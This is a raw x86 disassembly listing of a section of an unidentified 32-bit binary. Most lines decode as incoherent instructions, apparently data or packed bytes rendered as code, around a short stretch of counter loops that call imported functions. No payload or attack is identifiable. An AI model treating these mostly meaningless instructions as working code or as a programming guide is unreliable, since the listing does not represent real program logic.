  41c3e6:	das    
  41c3e7:	ficom  DWORD PTR [eax+0x70]
  41c3ea:	fs mov esp,0x87a0147
  41c3f0:	and    DWORD PTR [eiz*8-0x22f9ab42],ecx
  41c3f7:	ret    0x5564
  41c3fa:	aaa    
  41c3fb:	cmp    al,BYTE PTR [ecx+0x6e]
  41c3fe:	pusha  
  41c3ff:	pop    esi
  41c400:	rcl    BYTE PTR [esi+0xcd442b5],0xee
  41c407:	in     eax,dx
  41c408:	fwait
  41c409:	xor    BYTE PTR [ebx],ah
  41c40b:	cmc    
  41c40c:	scas   eax,DWORD PTR es:[edi]
  41c40d:	addr16 je 0x41c469
  41c410:	cmp    DWORD PTR [esi+0x704b0c2c],ebp
  41c416:	inc    esp
  41c417:	cmp    bh,BYTE PTR [ecx]
  41c419:	clc    
  41c41a:	hlt    
  41c41b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c41c:	lods   al,BYTE PTR ds:[esi]
  41c41d:	pop    ds
  41c41e:	ja     0x41c3c8
  41c420:	dec    edx
  41c421:	pop    eax
  41c422:	dec    ebx
  41c423:	daa    
  41c424:	pushf  
  41c425:	mov    ds,WORD PTR [ebx+0x18c5f4bf]
  41c42b:	cmp    eax,0xa44d9685
  41c430:	hlt    
  41c431:	clc    
  41c432:	xor    dh,BYTE PTR ds:0x1d58f047
  41c438:	inc    eax
  41c439:	jecxz  0x41c42c
  41c43b:	jno    0x41c40d
  41c43d:	inc    ebp
  41c43e:	leave  
  41c43f:	sub    eax,0x38783907
  41c444:	sub    bl,BYTE PTR [ebp-0x3f4975c3]
  41c44a:	fcomi  st,st(2)
  41c44c:	ret    0xd688
  41c44f:	ins    DWORD PTR es:[edi],dx
  41c450:	add    cl,BYTE PTR [eax-0x34bf09f]
  41c456:	fstp   TBYTE PTR [ebx]
  41c458:	mov    ds:0xc5e04501,al
  41c45d:	push   es
  41c45e:	lds    ebx,FWORD PTR [edx]
  41c460:	ss sub al,0x1c
  41c463:	je     0x41c40d
  41c465:	test   BYTE PTR [eax-0x58],dl
  41c468:	push   ebx
  41c469:	cld    
  41c46a:	shl    ebx,0xec
  41c46d:	add    DWORD PTR [esi-0x54],esi
  41c470:	xor    al,0x40
  41c472:	in     al,0xa4
  41c474:	mov    bh,0x50
  41c476:	cs loopne 0x41c447
  41c479:	mov    ah,al
  41c47b:	jp     0x41c49a
  41c47d:	xor    DWORD PTR [edx],ebx
  41c47f:	pop    ds
  41c480:	and    DWORD PTR [ebp+0x1c],0xffffffb0
  41c484:	lahf   
  41c485:	repnz iret 
  41c487:	pop    ds
  41c488:	cs aas 
  41c48a:	fld    DWORD PTR [edx+eax*2]
  41c48d:	call   0xc48db1d
  41c492:	and    DWORD PTR [ecx+0x7d6686fa],edx
  41c498:	or     al,0xb
  41c49a:	xor    DWORD PTR [bp-0x53],ebp
  41c49e:	or     dh,al
  41c4a0:	nop
  41c4a1:	cmp    DWORD PTR [ebp-0x71],0xffffffcf
  41c4a5:	pusha  
  41c4a6:	mov    esp,0xb0814759
  41c4ab:	sbb    esi,ebp
  41c4ad:	pop    edi
  41c4ae:	aad    0x84
  41c4b0:	(bad)  
  41c4b2:	loope  0x41c4f5
  41c4b4:	xor    eax,0x56a9f281
  41c4b9:	lahf   
  41c4ba:	lods   eax,DWORD PTR ds:[esi]
  41c4bb:	sahf   
  41c4bc:	cmc    
  41c4bd:	enter  0x8361,0xa4
  41c4c1:	int    0x54
  41c4c3:	in     eax,dx
  41c4c4:	je     0x41c521
  41c4c6:	inc    esi
  41c4c7:	xor    eax,0x61eabbae
  41c4cc:	or     ch,bl
  41c4ce:	mov    ebp,0xf77aca6b
  41c4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4d4:	adc    dl,dl
  41c4d6:	outs   dx,DWORD PTR ds:[esi]
  41c4d7:	sub    edx,DWORD PTR [ecx+0x32df96d7]
  41c4dd:	aaa    
  41c4de:	ret    
  41c4df:	hlt    
  41c4e0:	jge    0x41c53e
  41c4e2:	mov    al,0x8
  41c4e4:	xchg   ebp,eax
  41c4e5:	jns    0x41c496
  41c4e7:	data16 js 0x41c4b2
  41c4ea:	and    al,0xd1
  41c4ec:	fild   WORD PTR [eax]
  41c4ee:	dec    edx
  41c4ef:	addr16 jno 0x41c48d
  41c4f2:	sub    ebp,DWORD PTR [ecx+0x6f]
  41c4f5:	xchg   ecx,eax
  41c4f6:	and    esp,esp
  41c4f8:	rol    BYTE PTR [eax],0xf
  41c4fb:	js     0x41c55f
  41c4fd:	pinsrw mm6,WORD PTR [edi-0xf],0x4c
  41c502:	(bad)  
  41c503:	mov    ebx,0xc09d40b9
  41c508:	xor    al,0xa5
  41c50a:	pop    ecx
  41c50b:	lock ds jp 0x41c58d
  41c50f:	leave  
  41c510:	fstp   QWORD PTR [ebx+0x69caf05e]
  41c516:	scas   al,BYTE PTR es:[edi]
  41c517:	call   0xb9a895c
  41c51c:	jno    0x41c56e
  41c51e:	les    ebx,FWORD PTR [ecx+0x28]
  41c521:	mov    ebp,0xd63677cb
  41c526:	ins    BYTE PTR es:[edi],dx
  41c527:	es push ebx
  41c529:	fidiv  WORD PTR [esp+eax*8+0x4b]
  41c52d:	jmp    0x8bd62a68
  41c532:	cs mov esp,0xccdddcf7
  41c538:	pusha  
  41c539:	fdivr  QWORD PTR [ebp+0x3f9af6ce]
  41c53f:	and    BYTE PTR [edx-0x703b2736],al
  41c545:	or     ebx,DWORD PTR ds:0x80fc05fd
  41c54b:	and    BYTE PTR [eax+0x49eb8d58],cl
  41c551:	das    
  41c552:	and    ch,BYTE PTR [ecx]
  41c554:	je     0x41c5c9
  41c556:	or     cl,BYTE PTR [ebx+0x21f800bd]
  41c55c:	sbb    eax,0x6424e7b6
  41c561:	mov    ebx,DWORD PTR [edi+0x82d0d4a]
  41c567:	push   ebp
  41c568:	test   eax,0x29c0a5a8
  41c56d:	stc    
  41c56e:	jmp    0xad45b639
  41c573:	cmp    al,0xdd
  41c575:	fdiv   DWORD PTR [eax+eax*8-0x8f7016f]
  41c57c:	fadd   st,st(5)
  41c57e:	rcl    DWORD PTR [ecx+0x15380601],0x95
  41c585:	in     al,dx
  41c586:	sbb    esp,DWORD PTR [ebx+ebx*1]
  41c589:	mov    ecx,0x3400d2dd
  41c58e:	jbe    0x41c5a7
  41c590:	push   0x1c649980
  41c595:	lods   al,BYTE PTR ds:[esi]
  41c596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c597:	inc    esp
  41c598:	mov    bh,0xa7
  41c59a:	dec    edi
  41c59b:	(bad)
  41c5a0:	jmp    0x41c58f
  41c5a2:	call   DWORD PTR [eax+esi*8-0x40]
  41c5a6:	cmp    ch,BYTE PTR [ebx+eiz*4]
  41c5a9:	loop   0x41c568
  41c5ab:	inc    edi
  41c5ac:	or     al,0x62
  41c5ae:	mov    edi,0x864c3550
  41c5b3:	inc    ebp
  41c5b4:	or     BYTE PTR [ebx-0x635dd4b9],dl
  41c5ba:	dec    eax
  41c5bb:	sti    
  41c5bc:	inc    edx
  41c5bd:	clc    
  41c5be:	adc    eax,0xb1d237ed
  41c5c3:	iret   
  41c5c4:	mov    BYTE PTR [eax-0x7],al
  41c5c7:	test   BYTE PTR [esi+edi*4],al
  41c5ca:	test   al,0x89
  41c5cc:	loopne 0x41c604
  41c5ce:	jns    0x41c5e2
  41c5d0:	mov    ah,0xed
  41c5d2:	jns    0x41c5ac
  41c5d4:	lea    edx,[ecx+ebp*4+0x21]
  41c5d8:	sub    ch,BYTE PTR [ecx-0x42b58ac7]
  41c5de:	mov    al,0x3d
  41c5e0:	dec    esp
  41c5e1:	sub    bh,al
  41c5e3:	push   cs
  41c5e4:	mov    al,0x6f
  41c5e6:	push   ecx
  41c5e7:	or     eax,DWORD PTR [esi-0xd36bb3c]
  41c5ed:	daa    
  41c5ee:	jae    0x41c658
  41c5f0:	ds es pop eax
  41c5f3:	popf   
  41c5f4:	es push ss
  41c5f6:	push   ecx
  41c5f7:	mov    ebx,DWORD PTR [ebx]
  41c5f9:	pop    eax
  41c5fa:	add    edi,ecx
  41c5fc:	and    DWORD PTR ds:0x42a345,0x0
  41c606:	jmp    0x41c618
  41c60b:	mov    ebx,DWORD PTR ds:0x42a345
  41c611:	inc    ebx
  41c612:	mov    DWORD PTR ds:0x42a345,ebx
  41c618:	cmp    DWORD PTR ds:0x42a345,0x10
  41c61f:	jae    0x41cbd2
  41c625:	cmp    DWORD PTR ds:0x42a345,0xa
  41c62c:	jne    0x41c63b
  41c632:	push   DWORD PTR [ebp-0x28]
  41c635:	call   DWORD PTR ds:0x425000
  41c63b:	cmp    DWORD PTR ds:0x42a345,0x9
  41c642:	jne    0x41c655
  41c648:	mov    ebx,DWORD PTR ds:0x42a345
  41c64e:	inc    ebx
  41c64f:	mov    DWORD PTR ds:0x42a345,ebx
  41c655:	jmp    0x41c60b
  41c65a:	mov    DWORD PTR ds:0x42a375,0x18
  41c664:	cmp    DWORD PTR ds:0x42a375,0x0
  41c66b:	je     0x41cbd2
  41c671:	cmp    DWORD PTR ds:0x42a375,0x5
  41c678:	jne    0x41c68c
  41c67e:	push   0x6522
  41c683:	push   DWORD PTR [ebp-0xc]
  41c686:	call   DWORD PTR ds:0x425004
  41c68c:	cmp    DWORD PTR ds:0x42a375,0x6
  41c693:	jne    0x41c6a8
  41c699:	xor    ebx,ebx
  41c69b:	xor    ebx,DWORD PTR ds:0x42a375
  41c6a1:	dec    ebx
  41c6a2:	mov    DWORD PTR ds:0x42a375,ebx
  41c6a8:	mov    ebx,DWORD PTR ds:0x42a375
  41c6ae:	dec    ebx
  41c6af:	mov    DWORD PTR ds:0x42a375,ebx
  41c6b5:	jmp    0x41c664
  41c6ba:	or     DWORD PTR ds:0x42a385,edi
  41c6c0:	jmp    0x41cbd2
  41c6c5:	cmp    eax,0xc9cfc5c2
  41c6ca:	fcmovnbe st,st(5)
  41c6cc:	rol    BYTE PTR [esp+ebp*4+0x9cc6db4],cl
  41c6d3:	mov    ds:0x7f9da191,eax
  41c6d8:	js     0x41c74d
  41c6da:	jl     0x41c754
  41c6dc:	js     0x41c722
  41c6de:	out    dx,al
  41c6df:	ret    0x339b
  41c6e2:	pop    esp
  41c6e3:	punpckhwd mm3,mm1
  41c6e6:	pop    esi
  41c6e7:	dec    edx
  41c6e8:	imul   esp,esp,0xfbb60c73
  41c6ee:	ins    DWORD PTR es:[edi],dx
  41c6ef:	sub    dh,BYTE PTR [ebp+0xe1e8ff3]
  41c6f5:	icebp  
  41c6f6:	adc    BYTE PTR [ebx+eiz*8],bl
  41c6f9:	sbb    al,0xe0
  41c6fb:	jle    0x41c73b
  41c6fd:	(bad)  
  41c6fe:	xor    DWORD PTR ds:0xb34a856b,eax
  41c704:	mov    bl,0x32
  41c706:	ins    BYTE PTR es:[edi],dx
  41c707:	aad    0xb0
  41c709:	ror    cl,cl
  41c70b:	mov    esi,0x6026c8d8
  41c710:	vandnps xmm2,xmm6,XMMWORD PTR [ecx+edx*8-0x1]
  41c716:	add    BYTE PTR [edi],dh
  41c718:	sbb    al,0xe
  41c71a:	xlat   BYTE PTR ds:[ebx]
  41c71b:	sub    BYTE PTR [esi+0x5cf8426d],bl
  41c721:	out    dx,al
  41c722:	retf   0x16e9
  41c725:	push   0x6b
  41c727:	lahf   
  41c728:	test   eax,0x43fe0141
  41c72d:	out    0xdb,eax
  41c72f:	sub    ecx,ebx
  41c731:	or     al,0x50
  41c733:	xchg   ebp,eax
  41c734:	(bad)  [ebp+0x60cf8cee]
  41c73a:	ret    0xcac8
  41c73d:	jmp    0xf5f8:0x898ea97
  41c744:	test   BYTE PTR [esi-0xa],0x35
  41c748:	inc    edx
  41c749:	aas    
  41c74a:	jno    0x41c799
  41c74c:	mov    edx,0xc49147b0
  41c751:	into   
  41c752:	stos   BYTE PTR es:[edi],al
  41c753:	repz or BYTE PTR [edx-0x4433a04],0x2e
  41c75b:	stos   BYTE PTR es:[edi],al
  41c75c:	popf   
  41c75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c75e:	add    al,0xb8
  41c760:	mov    cl,0x6d
  41c762:	or     ch,ch
  41c764:	sub    bh,bl
  41c766:	sbb    BYTE PTR [ecx+0x38307621],bh
  41c76c:	inc    edx
  41c76d:	jnp    0x41c787
  41c76f:	imul   ebp,DWORD PTR [ebx],0xffffffe9
  41c772:	enter  0xb4fb,0xf4
  41c776:	xor    bh,dh
  41c778:	sub    DWORD PTR [eax],ecx
  41c77a:	sub    ebx,DWORD PTR [edx+0x66]
  41c77d:	dec    edi
  41c77e:	aaa    
  41c77f:	push   esp
  41c780:	outs   dx,DWORD PTR ds:[esi]
  41c781:	inc    edi
  41c782:	xchg   esi,eax
  41c783:	mov    ch,0xa4
  41c785:	adc    al,0x82
  41c787:	mov    ah,BYTE PTR [ebx+0x79]
  41c78a:	pop    esp
  41c78b:	fild   QWORD PTR [esi+eiz*4]
  41c78e:	push   cs
  41c78f:	fisub  WORD PTR [edx+0x6c5a8e80]
  41c795:	leave  
  41c796:	(bad)  
  41c797:	xor    DWORD PTR [eax],ecx
  41c799:	rcl    BYTE PTR [ebx],1
  41c79b:	sbb    al,0xa8
  41c79d:	sbb    cl,BYTE PTR [edx+0x70c130ba]
  41c7a3:	mov    bh,0x82
  41c7a5:	fstp   TBYTE PTR [edx-0x7]
  41c7a8:	leave  
  41c7a9:	test   al,0xbe
  41c7ab:	mov    DWORD PTR [edi+0x34cd4fac],ebp
  41c7b1:	fs enter 0xc510,0x52
  41c7b6:	pop    edx
  41c7b7:	call   0xa3c:0xaf0ee9bf
  41c7be:	sub    eax,0xace6bc81
  41c7c3:	cmp    DWORD PTR [ebx],ebp
  41c7c5:	inc    ebp
  41c7c6:	jbe    0x41c7c4
  41c7c8:	mov    ds:0xbd9b4aa3,eax
  41c7cd:	inc    ebp
  41c7ce:	push   ebx
  41c7cf:	fs push edi
  41c7d1:	dec    edi
  41c7d2:	popa   
  41c7d3:	jg     0x41c7b2
  41c7d5:	enter  0x9441,0xf2
  41c7d9:	cmp    eax,0x47b52794
  41c7de:	lahf   
  41c7df:	pop    ss
  41c7e0:	int    0x7d
  41c7e2:	jl     0x41c770
  41c7e4:	(bad)  [eax+0x4e]
  41c7e7:	test   eax,0xf48c6ba3
  41c7ec:	jno    0x41c809
  41c7ee:	jecxz  0x41c7e8
  41c7f0:	fcom   QWORD PTR [ecx]
  41c7f2:	daa    
  41c7f3:	imul   esi,DWORD PTR [ebp+0x65],0x65a66409
  41c7fa:	add    ebx,ebp
  41c7fc:	(bad)  
  41c7fd:	out    dx,eax
  41c7fe:	mov    eax,ds:0x21b155df
  41c803:	add    BYTE PTR [ebx+0x10],0xa3
  41c807:	fild   QWORD PTR [esi-0x3bb34f6a]
  41c80d:	fiadd  DWORD PTR [esp+edi*8]
  41c810:	add    eax,0x575d2163
  41c815:	daa    
  41c816:	pop    eax
  41c817:	dec    edi
  41c818:	test   BYTE PTR [edx-0x4f],dl
  41c81b:	sub    DWORD PTR [ebx-0x1785bd],eax
  41c821:	cld    
  41c822:	shl    al,cl
  41c824:	test   eax,0xc5187576
  41c829:	test   ebx,eax
  41c82b:	cdq    
  41c82c:	cmp    al,0x51
  41c82e:	ins    BYTE PTR es:[edi],dx
  41c82f:	cli    
  41c830:	inc    edx
  41c831:	ror    DWORD PTR [ebp+0x841fbab],cl
  41c837:	test   BYTE PTR [eax+eax*8-0x53],0xab
  41c83c:	shl    DWORD PTR [esi],1
  41c83e:	shl    DWORD PTR [edx+edi*2-0x22abafb3],1
  41c845:	rcr    DWORD PTR [esi+0x9c8a33a],0x26
  41c84c:	cs jmp 0x6763:0x9ac8da58
  41c854:	dec    eax
  41c855:	retf   
  41c856:	lock outs dx,BYTE PTR ds:[esi]
  41c858:	mov    eax,0x2afa6eb9
  41c85d:	add    bh,BYTE PTR [edi*4+0xd4f0220]
  41c864:	sbb    DWORD PTR [edi],edi
  41c866:	fnsave [esp+ecx*8+0x38dfee6b]
  41c86d:	jp     0x41c8aa
  41c86f:	addr16 mov ecx,0x507fd798
  41c875:	loopne 0x41c878
  41c877:	push   ss
  41c878:	mov    al,0xec
  41c87a:	push   0x4e
  41c87c:	movsx  edi,sp
  41c87f:	mov    al,0x68
  41c881:	jmp    ebp
  41c883:	sub    eax,0x8a5bc4b7
  41c888:	clc    
  41c889:	and    cl,BYTE PTR [ebx]
  41c88b:	pop    ebp
  41c88d:	adc    esp,DWORD PTR [ecx-0x5b71e57a]
  41c893:	cs (bad) 
  41c895:	stos   DWORD PTR es:[edi],eax
  41c896:	jp     0x41c889
  41c898:	out    0xbc,al
  41c89a:	shl    bl,0x81
  41c89d:	pop    ss
  41c89e:	js     0x41c897
  41c8a0:	mov    ebp,0xff11cfd7
  41c8a5:	xchg   edi,eax
  41c8a6:	mov    ebx,0x4ebc58
  41c8ab:	ja     0x41c849
  41c8ad:	fmul   st(6),st
  41c8af:	repz ret 0xcaa8
  41c8b3:	or     ch,BYTE PTR [edi+0x3]
  41c8b6:	hlt    
  41c8b7:	and    al,0x39
  41c8b9:	mov    dh,0x87
  41c8bb:	pusha  
  41c8bc:	enter  0x2463,0xe0
  41c8c0:	mov    eax,0x8784eb2f
  41c8c5:	and    al,0x5c
  41c8c7:	dec    ebx
  41c8c8:	fmul   st,st(1)
  41c8ca:	fisub  DWORD PTR [ecx]
  41c8cc:	or     DWORD PTR [edx],esp
  41c8ce:	jg     0x41c94c
  41c8d0:	iret   
  41c8d1:	out    dx,al
  41c8d2:	xchg   ecx,eax
  41c8d3:	cdq    
  41c8d4:	int    0x7b
  41c8d6:	pop    esi
  41c8d7:	shr    DWORD PTR [ebp+0x77],cl
  41c8da:	shr    BYTE PTR [ebx],0x96
  41c8dd:	xor    edi,ecx
  41c8df:	repnz fs push 0x6d
  41c8e3:	(bad)  
  41c8e4:	dec    ebx
  41c8e5:	dec    ebx
  41c8e6:	jmp    0x3f4d:0xb2b6ba99
  41c8ed:	jecxz  0x41c8f7
  41c8ef:	aam    0x4d
  41c8f1:	pusha  
  41c8f2:	xor    esi,esp
  41c8f4:	or     DWORD PTR [edx],esp
  41c8f6:	ficomp WORD PTR [eax+0x42]
  41c8f9:	lock lods al,BYTE PTR ds:[esi]
  41c8fb:	loopne 0x41c885
  41c8fd:	retf   
  41c8fe:	fsubr  QWORD PTR [edi+0x37dc7daa]
  41c904:	push   eax
  41c905:	and    eax,0x761cbefa
  41c90a:	outs   dx,BYTE PTR ds:[esi]
  41c90b:	dec    ebx
  41c90c:	int    0x30
  41c90e:	jns    0x41c8b0
  41c910:	mov    dh,0x4
  41c912:	gs dec edi
  41c914:	lods   eax,DWORD PTR ds:[esi]
  41c915:	sbb    ch,BYTE PTR [edx-0x30]
  41c918:	xchg   edi,eax
  41c919:	push   eax
  41c91a:	mov    WORD PTR [ecx-0x7028dbff],cs
  41c920:	outs   dx,BYTE PTR ds:[esi]
  41c921:	out    dx,eax
  41c922:	dec    ecx
  41c923:	jo     0x41c8e6
  41c925:	int    0x28
  41c927:	stc    
  41c928:	jne    0x41c92a
  41c92a:	arpl   WORD PTR [edx-0x33f55035],cx
  41c930:	shr    BYTE PTR [ebx+0x27],cl
  41c933:	pushf  
  41c934:	iret   
  41c935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c936:	push   edx
  41c937:	imul   esp,DWORD PTR [esi],0x571e1f7e
  41c93d:	push   eax
  41c93e:	add    BYTE PTR [ebp+0xccbc3d2],dl
  41c944:	xor    BYTE PTR [edx],cl
  41c946:	pop    DWORD PTR [eax]
  41c948:	shl    DWORD PTR [ebx],0x71
  41c94b:	dec    esi
  41c94c:	test   al,0x30
  41c94e:	call   0x38ca:0x399d0ce0
  41c955:	cmp    eax,0x3f1cabd4
  41c95a:	or     eax,0xcd266392
  41c95f:	ret    
  41c960:	fsub   DWORD PTR ds:0x7a6adc64
  41c966:	test   BYTE PTR [ecx+0x7a],ah
  41c969:	add    dl,BYTE PTR [edx+0x75]
  41c96c:	cmp    al,0x18
  41c96e:	nop
  41c96f:	xor    DWORD PTR [ebx+ebp*8-0x9c4eed4],ecx
  41c976:	jp     0x41c9b7
  41c978:	(bad)  
  41c979:	jp     0x41c9d2
  41c97b:	adc    eax,0x8df72516
  41c980:	int3   
  41c981:	adc    DWORD PTR [edx],ebx
  41c983:	sbb    edi,DWORD PTR [esp+esi*1]
  41c986:	pcmpgtb mm4,mm2
  41c989:	push   edx
  41c98a:	sbb    bh,BYTE PTR [edi-0x61]
  41c98d:	scas   eax,DWORD PTR es:[edi]
  41c98e:	fmul   QWORD PTR [edx]
  41c990:	sbb    edi,ecx
  41c992:	xchg   edx,eax
  41c993:	add    DWORD PTR [ecx-0x11],edx
  41c996:	scas   eax,DWORD PTR es:[edi]
  41c997:	adc    BYTE PTR [edi],0x6
  41c99a:	sbb    bh,BYTE PTR [ecx+eax*4]
  41c99d:	or     BYTE PTR [ebp+0x70],ch
  41c9a0:	popf   
  41c9a1:	leave  
  41c9a2:	push   ss
  41c9a3:	repnz lahf 
  41c9a5:	mov    ebx,0x237c579e
  41c9aa:	enter  0x4d04,0x4b
  41c9ae:	fadd   DWORD PTR [edx+edi*2]
  41c9b1:	retf   
  41c9b2:	pop    eax
  41c9b3:	mov    dh,0xd9
  41c9b5:	sti    
  41c9b6:	stos   BYTE PTR es:[edi],al
  41c9b7:	xor    al,0xfa
  41c9b9:	call   0x46bc0604
  41c9be:	sub    dl,BYTE PTR [edx]
  41c9c0:	fdivr  QWORD PTR fs:[ecx-0x2a]
  41c9c4:	ret    0x7ee5
  41c9c7:	add    DWORD PTR [esi],esi
  41c9c9:	xchg   edi,eax
  41c9ca:	xor    eax,0xaf633181
  41c9cf:	or     ebp,DWORD PTR [edx]
  41c9d1:	jo     0x41c9b8
  41c9d3:	push   eax
  41c9d4:	push   ds
  41c9d5:	mov    WORD PTR [ecx+0x73],?
  41c9d8:	loope  0x41ca45
  41c9da:	out    dx,eax
  41c9db:	push   0x336cf7a1
  41c9e0:	and    ah,bl
  41c9e2:	jns    0x41c9a8
  41c9e4:	imul   edi,DWORD PTR [ecx+0x6fb7cff7],0xffffff8e
  41c9eb:	call   DWORD PTR [ecx+0x729169f3]
  41c9f1:	pop    ecx
  41c9f2:	daa    
  41c9f3:	in     al,0xea
  41c9f5:	cmp    ah,BYTE PTR [ebp+0x3d]
  41c9f8:	hlt    
  41c9f9:	cmp    DWORD PTR [ecx+0x49bd5bc9],edi
  41c9ff:	aam    0x4
  41ca01:	jo     0x41c99b
  41ca03:	icebp  
  41ca04:	sti    
  41ca05:	push   es
  41ca06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca07:	fidivr DWORD PTR [ebx+ebx*8+0x4d9ad0b1]
  41ca0e:	div    DWORD PTR [ebp+0x13]
  41ca11:	int    0x2a
  41ca13:	xchg   ebx,eax
  41ca14:	sbb    BYTE PTR [edi+0x15],0x4f
  41ca18:	inc    ebx
  41ca19:	dec    DWORD PTR [ecx+0x29dd7af8]
  41ca1f:	adc    DWORD PTR [ebp-0x45eb2f5b],edx
  41ca25:	ret    0x941
  41ca28:	ins    DWORD PTR es:[edi],dx
  41ca29:	(bad)  
  41ca2a:	jmp    0x7d8b:0x7e3c5ab1
  41ca31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca32:	mov    dl,0x9d
  41ca34:	sbb    eax,0x7b8da8cb
  41ca39:	xchg   ebp,eax
  41ca3a:	idiv   BYTE PTR [ebp-0x1d]
  41ca3d:	dec    ecx
  41ca3e:	emms   
  41ca40:	jp     0x41ca76
  41ca42:	dec    ebp
  41ca43:	push   ebx
  41ca44:	stc    
  41ca45:	fld    TBYTE PTR [ecx-0x11]
  41ca48:	test   DWORD PTR [eax+0x30],0xec39825
  41ca4f:	mov    dl,bh
  41ca51:	add    al,0xaa
  41ca53:	mov    edx,0x64531c1e
  41ca58:	mov    cl,0x43
  41ca5a:	xchg   ebx,eax
  41ca5b:	mov    BYTE PTR [edx-0x48],al
  41ca5e:	dec    esp
  41ca5f:	pusha  
  41ca60:	xchg   ebx,eax
  41ca61:	imul   dl
  41ca63:	xor    esp,DWORD PTR [esi]
  41ca65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca66:	lock push edx
  41ca68:	pop    eax
  41ca69:	out    dx,eax
  41ca6a:	mov    bh,0xf0
  41ca6c:	in     eax,0xca
  41ca6e:	push   ds
  41ca6f:	and    BYTE PTR [ecx],0x7
  41ca72:	mov    edx,0xc6c36e70
  41ca77:	xchg   DWORD PTR [ebp+0x3],edi
  41ca7a:	stos   BYTE PTR es:[edi],al
  41ca7b:	cdq    
  41ca7c:	jb     0x41cafa
  41ca7e:	mov    bh,BYTE PTR [ecx-0x3fc70cb0]
  41ca84:	jmp    0x84c6:0xb5d1db28
  41ca8b:	xchg   edi,eax
  41ca8c:	leave  
  41ca8d:	mov    ds:0x56f079af,al
  41ca92:	or     DWORD PTR [ebx-0x3],esi
  41ca95:	in     eax,0x77
  41ca97:	call   0x1f0a48a8
  41ca9c:	retf   0xddbd
  41ca9f:	mov    ah,0x31
  41caa1:	(bad)  
  41caa2:	xor    esi,edi
  41caa4:	inc    eax
  41caa5:	lods   eax,DWORD PTR ds:[esi]
  41caa6:	push   ecx
  41caa7:	int3   
  41caa8:	mov    dl,0xf9
  41caaa:	xchg   ecx,eax
  41caab:	ins    DWORD PTR es:[di],dx
  41caad:	lahf   
  41caae:	or     al,0xf8
  41cab0:	pop    ds
  41cab1:	loope  0x41ca78
  41cab3:	call   0xa479:0xb7c40e86
  41caba:	jle    0x41caba
  41cabc:	mov    edx,0x989d6e59
  41cac1:	(bad)  
  41cac2:	pusha  
  41cac3:	aas    
  41cac4:	pushf  
  41cac5:	stos   DWORD PTR es:[edi],eax
  41cac6:	mov    bh,0x9d
  41cac8:	mov    dh,BYTE PTR [eax+edi*8]
  41cacb:	push   edx
  41cacc:	rcl    BYTE PTR [eax-0x25],0x63
  41cad0:	(bad)  
  41cad1:	loopne 0x41ca9c
  41cad3:	imul   esi,esi,0xa4296c02
  41cad9:	hlt    
  41cada:	psubw  mm1,QWORD PTR [eax-0x45d7959e]
  41cae1:	pop    esi
  41cae2:	shl    DWORD PTR [ebx-0x36],cl
  41cae5:	leave  
  41cae6:	push   edx
  41cae7:	fldcw  WORD PTR ds:0x3e110cc1
  41caed:	sbb    al,0xe1
  41caef:	sub    DWORD PTR [esp+ebx*8],ebx
  41caf2:	cwde   
  41caf3:	push   edx
  41caf4:	jp     0x41cb44
  41caf6:	dec    edi
  41caf7:	fiadd  WORD PTR [edi+0x4c]
  41cafa:	std    
  41cafb:	mov    ebp,edx
  41cafd:	push   eax
  41cafe:	fidiv  DWORD PTR [edi-0x190d3487]
  41cb04:	add    DWORD PTR [ebx-0x69],edx
  41cb07:	out    dx,al
  41cb08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb09:	sub    BYTE PTR fs:[edx-0xc0af6a4],al
  41cb10:	aas    
  41cb11:	sub    esi,ebp
  41cb13:	dec    edx
  41cb14:	jp     0x41cac1
  41cb16:	mov    esp,0x383eff50
  41cb1b:	sbb    BYTE PTR [eax-0x4138565d],cl
  41cb21:	repz jecxz 0x41cb3b
  41cb24:	pop    esp
  41cb25:	dec    edx
  41cb26:	and    eax,0xb6d819d9
  41cb2b:	pop    esp
  41cb2c:	addr16 xchg esi,eax
  41cb2e:	inc    edi
  41cb2f:	or     DWORD PTR [edx+0x3f88fe1d],0x48f531cf
  41cb39:	fcomp  QWORD PTR [eax]
  41cb3b:	mov    ebp,ebp
  41cb3d:	(bad)  
  41cb3e:	fbstp  TBYTE PTR [eax+edi*8]
  41cb41:	repnz push 0x7d
  41cb44:	push   edi
  41cb45:	jle    0x41cbb5
  41cb47:	mov    edx,DWORD PTR [ecx+0x71]
  41cb4a:	into   
  41cb4b:	inc    ebp
  41cb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4d:	(bad)  
  41cb4e:	adc    edi,ebx
  41cb50:	push   es
  41cb51:	jmp    0xff26f927
  41cb56:	repnz es cmp esp,ecx
  41cb5a:	in     eax,dx
  41cb5b:	ja     0x41cb80
  41cb5d:	in     eax,dx
  41cb5e:	xlat   BYTE PTR ds:[ebx]
  41cb5f:	mov    esp,0xc766bec0
  41cb64:	inc    edx
  41cb65:	jne    0x41cbcb
  41cb67:	push   cs
  41cb68:	mov    ss,WORD PTR [esi]
  41cb6a:	sbb    esi,ebp
  41cb6c:	fild   QWORD PTR ss:[ecx-0x52]
  41cb70:	push   0x3593b307
  41cb75:	repz inc edx
  41cb77:	jns    0x41cb8c
  41cb79:	scas   al,BYTE PTR es:[edi]
  41cb7a:	or     DWORD PTR [ecx+0x57],eax
  41cb7d:	out    dx,al
  41cb7e:	in     al,0x2b
  41cb80:	adc    ebp,edx
  41cb82:	push   edx
  41cb83:	pop    ds
  41cb84:	ret    0xb14b
  41cb87:	(bad)  
  41cb88:	lds    esi,FWORD PTR ds:0xe58059ef
  41cb8e:	jp     0x41cbd8
  41cb90:	push   ebx
  41cb91:	inc    edx
  41cb93:	stos   BYTE PTR es:[edi],al
  41cb94:	cld    
  41cb95:	sbb    edi,DWORD PTR [eax+edx*8-0x643748f3]
  41cb9c:	cmp    ah,al
  41cb9e:	popa   
  41cb9f:	mov    ah,0x72
  41cba1:	pop    ecx
  41cba2:	cwde   
  41cba3:	jmp    0x41cbd2
  41cba5:	push   0xe6fc8f21
  41cbaa:	les    eax,FWORD PTR [edi]
  41cbac:	jmp    0x41cba3
  41cbae:	cmp    eax,0xa0b502e9
  41cbb3:	dec    edi
